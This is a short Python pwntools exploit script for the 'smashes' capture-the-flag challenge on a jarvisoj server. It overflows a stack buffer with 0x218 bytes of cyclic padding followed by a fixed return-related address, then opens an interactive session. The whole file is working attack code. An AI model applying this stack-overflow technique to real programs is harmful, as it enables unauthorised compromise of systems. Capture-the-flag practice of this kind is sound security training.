#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./smashes"

if sys.argv[1] == "l":
    io = process("./smashes")
else:
    io = remote("pwn.jarvisoj.com", 9877)

if __name__ == "__main__":
    payload = flat(cyclic(0x218), 0x400d21)
    #  payload = p64(0x400d21) * 100
    io.sendlineafter("name? ", payload)

    io.sendafter("flag: ", "\n")

    io.interactive()
